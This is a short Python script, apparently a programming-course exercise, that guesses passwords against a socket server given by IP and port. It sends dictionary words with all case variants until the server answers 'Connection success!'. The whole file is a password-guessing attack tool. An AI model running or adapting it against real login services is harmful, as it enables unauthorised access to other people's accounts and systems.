import sys
import socket
import string
import itertools

alphabet_lower = string.ascii_lowercase
alphabet_upper = string.ascii_uppercase
numbers = [str(x) for x in range(0, 10)]
max_attempts = 1_000_000
allowed_tokens = list(itertools.chain(alphabet_upper, alphabet_lower, numbers))
path_to_file = "passwords.txt"


def get_password():
    for i in range(1, len(allowed_tokens)):
        for p_word in itertools.product(allowed_tokens, repeat=i):
            yield ''.join(p_word)


def generate_lower_first_passwords(word):
    tuples = zip(word.lower(), word.upper())
    for p in itertools.product(*tuples):
        yield ''.join(p)


def get_pass_line_generator(path):
    with open(path, 'r', encoding='utf8') as f:
        for line in f:
            yield line.strip()


def generate_password():
    line_gen = get_pass_line_generator(path_to_file)
    for line in line_gen:
        if line.isnumeric():
            yield line
        else:
            pass_gen = generate_lower_first_passwords(line)
            for p in pass_gen:
                yield p


def connect():
    args = sys.argv
    ip_addr = args[1]
    port = int(args[2])

    with socket.socket() as sock:
        sock.connect((ip_addr, port))
        buffer = 1024
        password_generator = generate_password()
        for message in password_generator:
            encoded_message = message.encode()
            sock.send(encoded_message)
            response = sock.recv(buffer)
            decoded = response.decode()
            if decoded == "Connection success!":
                print(message)
                break


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    connect()
